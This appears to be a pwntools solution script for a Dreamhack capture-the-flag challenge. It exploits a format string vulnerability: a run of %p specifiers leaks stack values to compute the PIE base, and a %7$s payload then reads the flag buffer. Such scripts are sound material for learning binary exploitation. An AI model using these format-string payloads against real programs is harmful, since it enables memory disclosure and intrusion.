from pwn import *

# rdi, rsi, rdx, rcx, r8, r9, rsp, rsp+0x8...
# flag_buf : PIE_BASE + 0x4060

HOST, PORT = 'host8.dreamhack.games 12667'.split()
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def slog(n, a): return success(': '.join([n, hex(a)]))

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    #p = process('./chall')
    p = remote('localhost', 80)

e = ELF('./chall')
flag_buf = e.sym["flag_buf"]

# 0x3d80

# 1. read << It changes the addr to nop instruction
#p.sendlineafter(b'> ', b'1')

# 2. fsb
p.sendlineafter(b'> ', b'2')
pause()
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
PIE_BASE = int(p.recvline().split(b'.')[13], 16) - 0x3d80
slog("PIE_BASE", PIE_BASE)

flag_buf += PIE_BASE
slog("Flag buf", flag_buf)

p.sendlineafter(b'> ', b'1') # read flag
p.sendlineafter(b'> ', b'2')

pause()
pay = b'%7$sAAAA' + p64(flag_buf)
p.sendline(pay)

p.interactive()